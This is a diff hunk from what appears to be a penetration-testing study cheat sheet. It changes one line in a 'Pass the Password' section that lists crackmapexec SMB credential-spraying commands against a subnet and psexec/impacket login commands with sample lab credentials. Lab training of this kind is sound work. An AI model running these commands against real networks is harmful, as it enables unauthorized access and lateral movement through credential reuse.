@@ -83,7 +83,7 @@ Transfer loot back to kali:
 ## Pass the Password Attack (Come back to this step for lateral movement) 
 1. Lets say we have some credentials. Lets try to pass the password/hash to other connected networks. Would be great if we could get to DC straight away but usually, we wont. 
 2. `crackmapexec smb 192.168.119.0/24 -u SOMEUSERNAME -d DOMAIN.LOCAL -p SOMEPASSWORD` 
-3. `crackmapexec smb 192.168.219.122 -u ./users.txt -p ./passwords.txt --continue-on-success` check if other users use the same password
+3. `crackmapexec smb $IP -u ./users.txt -p ./passwords.txt --continue-on-success` check if other users use the same password
 4. `psexec DOMAIN/username:SOMEPASSWORD@TARGETIP ` to login if sucessful
 5. E.G `python /usr/share/doc/python3-impacket/examples/psexec.py  offsec/Allison:'RockYou!'@192.168.125.59`
 ## Pass the Hash or crack(gained from local SAM)
